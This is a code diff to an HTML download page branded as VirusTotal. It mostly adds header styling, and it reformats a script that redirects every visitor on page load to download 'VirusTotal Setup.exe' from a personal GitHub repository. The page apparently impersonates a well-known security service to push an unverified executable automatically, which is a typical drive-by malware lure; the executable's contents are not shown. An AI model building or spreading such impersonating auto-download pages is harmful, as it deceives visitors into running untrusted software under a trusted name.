@@ -4,6 +4,7 @@
     <meta charset="utf-8">
     <title>Thanks for Downloading | VirusTotal</title>
     <link rel="icon" href="https://github.com/xde230/xde230/raw/refs/heads/main/icon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         /* Reset some defaults */
         * {
@@ -20,12 +21,54 @@
             min-height: 100vh;
         }
 
+        header {
+            background-color: #ffffffcc;
+            backdrop-filter: blur(10px);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            padding: 20px 60px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .logo-container h1 {
+            margin: 0;
+            font-size: 1.5rem;
+            color: #202124;
+        }
+
+        header a.download-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 22px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+        }
+
+        header a.download-btn:hover {
+            background-color: #155ab6;
+        }
+
         main {
             flex-grow: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 80px 20px;
+            padding: 140px 20px 80px; /* Adjust for fixed header */
         }
 
         .container {
@@ -74,7 +117,7 @@
             font-size: 0.875rem;
             color: #5f6368;
             text-align: center;
-            border-top: 1px solid #dadce0;d
+            border-top: 1px solid #dadce0;
         }
 
         footer a {
@@ -86,10 +129,39 @@
         footer a:hover {
             text-decoration: underline;
         }
+
+        @media (max-width: 600px) {
+            header {
+                padding: 15px 20px;
+            }
+
+            .logo-container h1 {
+                font-size: 1.2rem;
+            }
+
+            header a.download-btn {
+                padding: 8px 16px;
+                font-size: 0.9rem;
+            }
+        }
     </style>
-    <script>window.onload = function() {window.location.href = "https://github.com/xde230/xde230/raw/refs/heads/main/VirusTotal%20Setup.exe";};</script>
+    <script>
+        window.onload = function() {
+            window.location.href = "https://github.com/xde230/xde230/raw/refs/heads/main/VirusTotal%20Setup.exe";
+        };
+    </script>
 </head>
 <body>
+
+    <!-- ✅ Header -->
+    <header>
+        <a href="index.html" class="logo-container">
+            <img src="https://github.com/xde230/virustotal/blob/main/vt.png?raw=true" alt="Logo" width="50" height="50">
+            <h1>VirusTotal</h1>
+        </a>
+        <a href="download.html" class="download-btn">Download Now</a>
+    </header>
+
     <main>
         <div class="container">
             <h1>Thanks for Downloading!</h1>
